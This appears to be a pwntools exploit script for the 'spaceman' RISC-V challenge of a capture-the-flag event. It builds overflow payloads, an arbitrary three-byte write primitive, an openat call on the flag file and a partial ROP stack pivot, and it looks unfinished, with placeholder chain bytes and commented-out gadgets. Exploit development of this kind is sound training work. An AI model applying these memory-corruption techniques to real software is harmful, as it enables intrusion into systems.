#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13372

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
        set architecture riscv:rv64
        target remote localhost:1234
    '''

    if args.GDB:
        return process(['qemu-riscv64', '-g', '1234', 'spaceman'], level='error')
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def write_three_bytes(io, p_addr, addr, data): 
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["read"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))

    sl(io, data)
    
def write_data(io, pp_addr, p_addr, addr, data):
    # for some reason the function is being weird
    # so instead of fixing it I am just gonna add something to cope with it
    # spoken like a true programmer
    data = b"AAA\x00\x00" + data

    for i in range(int(len(data) / 3)):
        print(data[i * 3: i * 3 + 3])
        write_three_bytes(io, p_addr, addr, data[i * 3: i * 3 + 4])
        addr += 3

        write_three_bytes(io, pp_addr, p_addr, p32(addr))

def open_at(io, p_addr, addr):
    payload = b"A"*0x10 + p64(p_addr)
    payload += p64(e.sym["openat"]) # make look up table point to anywhere
    
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(addr))
 

def exploit(io,e):
    sleep(5)
    # 0x8a488 => 0x8a2b8 => 0x8a518 => writeable mem
    chain = b"A" * 8 + p64(0xdeadbeef)
    sla(io, b"LOGIN: ", chain)

    #write_three_bytes(io, 0x89070, 0x8b1c8, b"AAA")
    #write_three_bytes(io, 0x8a2b8, 0x8a518, b"AAA")
    #write_three_bytes(io, 0x8a488, 0x8a2b8, b"\x1b\xa5\x08")
    #write_three_bytes(io, 0x8a2b8, 0x8a51b, b"AAA")
    # write flag.txt
    write_data(io, 0x8a488, 0x8a2b8, 0x8a51b, b"/home/papichulo/Desktop/ExploitDev/LiveCTF/BuckeyeCTF/spaceman-chal/flag.txt\x00\x00")
    
    # set ptr back to beginning of flag.txt
    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a520))
    open_at(io, 0x8a2b8, 0x8a520) # fd is at 5
 
    # write ROP
    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a510))
    write_data(io, 0x8a488, 0x8a2b8, 0x8a510 - 5, b"BBBBBBBB")
    write_three_bytes(io, 0x8a488, 0x8a2b8, p32(0x8a510))
    
    # stack pivot
    payload = b"A"*0x10 + p64(0x8a2b8)
    #payload += p64(0x4251e) # c.mv ra, a1 ; ... ; jr ra
    #payload += p64(0x3e5ea) # c.mv ra, gp
    #payload += p64(0x2fbb0) # c.ldsp ra, sp(0) <= this is the username buffer
    

    # 0x000000000002475a : addi a7, zero, 0x3f ; ecall
    
    # 0x000000000004cdfc : c.add a7, s0 ; c.jr ra

    # 0x0000000000011d8e : c.ldsp a7, 0x10(sp) ; c.mv s0, a0 ; beq a0, a5, -0x5d8


    payload += p64(0x1084a)
    sla(io, b"COMMAND>", payload)
    sla(io, b"COMMAND>", p64(0x8a510))

    #sleep(5)
    #sl(io,b"fla")

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
